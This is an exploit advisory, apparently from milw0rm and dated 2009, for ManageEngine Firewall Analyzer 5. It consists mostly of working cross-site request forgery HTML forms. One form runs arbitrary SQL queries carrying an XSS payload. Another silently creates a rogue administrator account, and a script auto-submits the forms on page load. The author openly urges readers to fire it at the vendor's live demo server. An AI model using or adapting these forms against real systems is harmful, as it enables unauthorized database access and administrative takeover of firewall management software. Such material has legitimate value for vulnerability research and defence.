<html><head><title>ManageEngine Firewall Analyzer 5 XSRF/XSS Vulnerability</title></head><pre>Written By Michael Brooks
Special thanks to str0ke!


Product: ManageEngine Firewall Analyzer 5 - XSRF and XSS
Vulerable version:
Build Version  :  	5.0.0
Build Number  :  	5000
Build Date  :  	Apr_25
homepage:
http://fwanalyzer.com/

This is live exploit code against the online demo.   Go ahead,  run it!

With this exploit you can execute any SQL query you want,  this is not
SQL Injection.  I think its funny that the sql query is also
vulnerable to xss.

XSRF to execute Arbatrary SQL Queries.  This is not SQL Injection,
its better because you can execute *any*  query.
&lt;html&gt;
	&lt;form action='http://demo.fwanalyzer.com/fw/runQuery.do' method='POST' id=1&gt;
		&lt;input type=hidden name=&quot;execute&quot; value=&quot;true&quot; &gt;
		&lt;input type=hidden name=&quot;DatabaseType&quot; value=&quot;mysql&quot;&gt;
		&lt;input type=hidden name=&quot;query&quot; value='select
&quot;&lt;script&gt;alert(/0wn3d/)&lt;/script&gt;&quot;'&gt;
		&lt;input type=submit&gt;
	&lt;/form&gt;
&lt;/html&gt;

Create a new administrative account badmin:badmin:
&lt;html&gt;
	&lt;form action='http://demo.fwanalyzer.com/fw/userManagementForm.do'
method='POST' id=2&gt;
		&lt;input type=hidden name='addField' value='true'&gt;
		&lt;input type=hidden name='productName' value='firewall'&gt;
		&lt;input type=hidden name='userType' value='Administrator'&gt;
		&lt;input type=hidden name='licType' value='Prem'&gt;
		&lt;input type=hidden name='userName' value='madmin'&gt;
		&lt;input type=hidden name='pwd1' value='badmin'&gt;
		&lt;input type=hidden name='password' value='badmin'&gt;
		&lt;input type=hidden name='userGroup' value='Administrator'&gt;
		&lt;input type=hidden name='email' value='badmin@badmin.com'&gt;
		&lt;input type=hidden name='availableDevices' value='301'&gt;
		&lt;input type=hidden name='Submit3' value='Add User'&gt;
		&lt;input type=submit&gt;
		&lt;/form&gt;
&lt;/html&gt;

&lt;script&gt;
	document.getElementById(1).submit();
	//document.getElementById(2).submit();
&lt;/script&gt;

# milw0rm.com [2009-01-29]</pre></html>